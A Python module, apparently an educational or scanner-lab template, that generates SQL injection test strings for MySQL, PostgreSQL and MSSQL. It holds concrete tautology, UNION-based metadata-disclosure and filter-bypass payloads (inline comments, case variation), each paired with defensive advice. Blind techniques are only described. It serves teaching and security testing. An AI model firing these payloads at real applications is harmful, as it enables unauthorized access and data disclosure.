"""
SQL Injection Payload Module - Educational Template Generator (Simulation Mode)

Reference: OWASP SQL Injection
https://owasp.org/www-community/attacks/SQL_Injection

Scope:
- Error-based: strings allowed (lab/scanner examples)
- Union-based: strings allowed (lab/scanner examples)
- Blind boolean/time-based: DESCRIPTION ONLY (no concrete payload strings)
- DB type selector: MySQL / PostgreSQL / MSSQL
- Comment-based bypass examples
- Case variation logic
- No live DB interaction
"""


class SQLiPayloadGenerator:
    SUPPORTED_DBS = ("mysql", "postgresql", "mssql")

    def __init__(self, db_type="mysql", case_variants=True):
        self.db_type = (db_type or "mysql").lower()
        if self.db_type not in self.SUPPORTED_DBS:
            raise ValueError(f"Unsupported db_type '{db_type}'. Use one of: {', '.join(self.SUPPORTED_DBS)}")
        self.case_variants = bool(case_variants)
        self.comment_chars = self._get_comment_chars()

    def _get_comment_chars(self):
        return {
            "mysql": ["--+", "#", "/* */"],
            "postgresql": ["--", "/* */"],
            "mssql": ["--", "/* */"],
        }[self.db_type]

    def _mix_case(self, s: str) -> str:
        out, up = [], True
        for ch in s:
            if ch.isalpha():
                out.append(ch.upper() if up else ch.lower())
                up = not up
            else:
                out.append(ch)
        return "".join(out)

    def _kw(self, keyword: str):
        if not self.case_variants:
            return [keyword]
        mixed = self._mix_case(keyword)
        return [keyword] if mixed == keyword else [keyword, mixed]

    def _item(self, subtype, payload, description, bypass_explanation, defensive_notes, note=None):
        d = {
            "type": "SQLi",
            "subtype": subtype,
            "db_type": self.db_type,
            "payload": payload,
            "description": description,
            "bypass_explanation": bypass_explanation,
            "defensive_notes": defensive_notes,
        }
        if note:
            d["note"] = note
        return d

    def generate_all_types(self):
        payloads = []
        payloads.extend(self._generate_error_based())
        payloads.extend(self._generate_union_based())
        payloads.extend(self._blind_boolean_description_only())
        payloads.extend(self._blind_time_description_only())
        payloads.extend(self._bypass_techniques())
        return payloads

    def _generate_error_based(self):
        c0 = self.comment_chars[0]
        items = [
            self._item(
                "Error-based",
                "' OR '1'='1",
                "Classic tautology (authentication bypass attempt)",
                "Creates an always-true predicate that may alter WHERE clause logic.",
                "Use parameterized queries (prepared statements). Never concatenate user input into SQL.",
            ),
            self._item(
                "Error-based",
                f"' OR 1=1{c0}",
                "Tautology + trailing comment",
                "Comment syntax truncates the rest of the original SQL statement.",
                "Prepared statements render comment tokens harmless; also avoid verbose DB errors to users.",
            ),
        ]

        # Optional: show keyword case variants as separate examples
        for kw in self._kw("UNION SELECT"):
            items.append(
                self._item(
                    "Error-based (Case variation)",
                    f"' {kw} NULL{c0}",
                    f"Case-variation example for keyword: {kw}",
                    "Some filters are case-sensitive; SQL keywords are commonly treated case-insensitively.",
                    "Do not rely on keyword filtering. Use parameterized queries and strict input validation.",
                )
            )
        return items

    def _generate_union_based(self):
        c0 = self.comment_chars[0]
        items = [
            self._item(
                "Union-based",
                f"' UNION SELECT NULL,NULL{c0}",
                "Union test with NULLs (column count/type probing)",
                "NULL can often fit multiple data types; helps align UNION columns.",
                "Use parameterized queries; least privilege DB accounts; restrict metadata exposure.",
            ),
        ]

        # DB-specific metadata example (strings allowed)
        if self.db_type == "mysql":
            items.append(
                self._item(
                    "Union-based",
                    f"' UNION SELECT NULL,database(){c0}",
                    "MySQL: example retrieving current database name",
                    "Shows how UNION may pull DB metadata into response.",
                    "Use parameterized queries; avoid reflecting DB output; least privilege + monitoring.",
                )
            )
        elif self.db_type == "postgresql":
            items.append(
                self._item(
                    "Union-based",
                    f"' UNION SELECT NULL,version(){c0}",
                    "PostgreSQL: version disclosure example",
                    "Demonstrates information disclosure via UNION-based injection.",
                    "Hide detailed errors; use prepared statements; remove risky string concatenations.",
                )
            )
        elif self.db_type == "mssql":
            items.append(
                self._item(
                    "Union-based",
                    f"' UNION SELECT NULL,@@version{c0}",
                    "MSSQL: @@version disclosure example",
                    "UNION can return system variables if accessible.",
                    "Use parameterization; restrict permissions; consider WAF as defense-in-depth only.",
                )
            )

        return items

    def _blind_boolean_description_only(self):
        return [
            self._item(
                "Blind (Boolean-based) - Description only",
                "",
                "Blind boolean SQLi uses true/false conditions and observes response differences.",
                "Attackers infer data via conditional checks (often automated with many requests).",
                "Use parameterized queries; make responses consistent; rate-limit and detect anomalies.",
                note="No concrete payload string provided (per scope).",
            )
        ]

    def _blind_time_description_only(self):
        return [
            self._item(
                "Blind (Time-based) - Description only",
                "",
                "Blind time SQLi uses conditional delays to infer whether a predicate was true.",
                "Observable response delays confirm execution paths and can extract data over time.",
                "Use parameterized queries; enforce timeouts; detect unusual latency patterns.",
                note="No concrete payload string provided (per scope).",
            )
        ]

    def _bypass_techniques(self):
        c1 = self.comment_chars[1] if len(self.comment_chars) > 1 else self.comment_chars[0]
        return [
            self._item(
                "Bypass Technique",
                f"' OR 1=1{c1}",
                "Alternative comment style",
                "Different comment tokens can bypass simplistic filters.",
                "Prefer parameterized queries; normalize input before validation; do not rely on denylist checks.",
            ),
            self._item(
                "Bypass Technique",
                "admin'/**/OR/**/1=1--",
                "Inline comment to bypass space filtering",
                "Comments act as separators; some filters only check spaces.",
                "Allowlist validation + prepared statements. Keyword filtering is fragile.",
            ),
        ]
